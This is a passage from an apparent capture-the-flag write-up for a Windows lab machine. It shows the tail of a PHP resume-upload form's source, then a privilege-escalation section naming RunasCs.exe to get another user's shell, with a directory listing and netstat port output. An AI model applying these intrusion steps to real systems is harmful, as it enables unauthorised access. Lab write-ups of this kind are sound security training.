</span></span><span style="display:flex;"><span>  padding: <span style="color:#bd93f9">5</span>px <span style="color:#bd93f9">8</span>px;
</span></span><span style="display:flex;"><span>  outline: none;
</span></span><span style="display:flex;"><span>  white<span style="color:#ff79c6">-</span>space: nowrap;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">-</span>webkit<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>select: none;
</span></span><span style="display:flex;"><span>  cursor: pointer;
</span></span><span style="display:flex;"><span>  text<span style="color:#ff79c6">-</span>shadow: <span style="color:#bd93f9">1</span>px <span style="color:#bd93f9">1</span>px <span style="color:#6272a4">#fff;</span>
</span></span><span style="display:flex;"><span>  font<span style="color:#ff79c6">-</span>weight: <span style="color:#bd93f9">700</span>;
</span></span><span style="display:flex;"><span>  font<span style="color:#ff79c6">-</span>size: <span style="color:#bd93f9">10</span>pt;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>::placeholder{
</span></span><span style="display:flex;"><span>color:<span style="color:#6272a4">#151715;</span>
</span></span><span style="display:flex;"><span>opacity:<span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>magic h3{
</span></span><span style="display:flex;"><span>    text<span style="color:#ff79c6">-</span>align: left;
</span></span><span style="display:flex;"><span>    padding<span style="color:#ff79c6">-</span>left: <span style="color:#bd93f9">260</span>px;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>style<span style="color:#ff79c6">&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>center<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;magic&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>h1<span style="color:#ff79c6">&gt;</span> Job Application Submission<span style="color:#ff79c6">&lt;/</span>h1<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>hr style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:inherit;padding:0px;height:2px; background:#000000&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notifi&#34;</span><span style="color:#ff79c6">&gt;&lt;</span>?php echo <span style="color:#f1fa8c">&#34;$notifi&#34;</span>; ?<span style="color:#ff79c6">&gt;&lt;/</span>span<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>form action<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> method<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> enctype<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Full Name:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputstyle&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fullname&#34;</span> placeholder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Example : John Doe&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Email:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputstyle&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> placeholder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34; Example : xxx123@xyz.abc&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Work Experience<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span>  <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;experience&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">20</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">30</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;</span>      
</span></span><span style="display:flex;"><span>	  <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Requested Salary<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;salary&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;30 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">30</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;60 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">60</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;80 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">80</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;100 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">100</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;200 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">200</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;300 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">300</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Choose Your Department<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span>style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span>  name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;department&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;IT&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>IT<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Sales&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>Sales<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Management&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>Management<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;&lt;</span>div style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;display:flex; flex-direction:column;  align-items: center;justify-content: center;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">&lt;</span>h3 style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;padding-left:50px&#34;</span> <span style="color:#ff79c6">&gt;</span>Upload Resume:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstylef&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;file&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;assignment&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>button type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span><span style="color:#ff79c6">&gt;</span>Upload Resume<span style="color:#ff79c6">&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>form<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>center<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>html<span style="color:#ff79c6">&gt;</span> 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Using <code>RunasCs.exe</code> I was able to get <code>tstark</code>&rsquo;s shell and found the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\Users\tstark\Desktop&gt;dir
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\Users\tstark\Desktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>04/29/2024  02:40 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>01/18/2024  11:33 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>04/29/2024  02:40 AM             7,168 a.exe
</span></span><span style="display:flex;"><span>04/28/2024  09:59 PM                34 user.txt
</span></span><span style="display:flex;"><span>               2 File(s)          7,202 bytes
</span></span><span style="display:flex;"><span>               2 Dir(s)   4,989,374,464 bytes free
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\Users\tstark\Desktop&gt;
</span></span></code></pre></div><p>After a lot of enumeration I found some open ports on the box.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>C:\Users\tstark\Downloads<span style="color:#ff79c6">&gt;</span>netstat <span style="color:#ff79c6">-</span>ano <span style="color:#ff79c6">|</span> findstr <span style="color:#f1fa8c">&#34;LISTENING&#34;</span>
</span></span><span style="display:flex;"><span>netstat <span style="color:#ff79c6">-</span>ano <span style="color:#ff79c6">|</span> findstr <span style="color:#f1fa8c">&#34;LISTENING&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">80</span>             <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">88</span>             <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">135</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">389</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">443</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">445</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">464</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">593</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">636</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3268</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3269</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3306</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7116</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3389</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">352</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">5985</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">8083</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">9389</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">2916</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">47001</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49664</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49665</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">544</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49666</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">1172</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49667</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">1560</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49668</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49670</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">2260</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55479</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55485</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55495</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">664</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">60177</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">60180</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7244</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span>:<span style="color:#bd93f9">53</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span>:<span style="color:#bd93f9">139</span>         <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
